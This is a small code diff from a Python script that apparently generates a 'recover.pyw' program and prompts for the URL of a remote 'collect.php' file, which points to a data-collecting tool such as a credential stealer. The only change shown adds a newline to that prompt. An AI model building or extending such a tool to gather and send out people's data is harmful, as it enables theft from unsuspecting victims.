@@ -77,7 +77,7 @@ def main():
 main()
 ''')	
 f.close()
-siteLink = input("Please enter the link to your collect file (ex: http://examplesite.com/collect.php)")
+siteLink = input("Please enter the link to your collect file (ex: http://examplesite.com/collect.php) \n")
 a = open('recover.pyw','r+')
 readcontent = a.read()
 a.seek(0, 0)
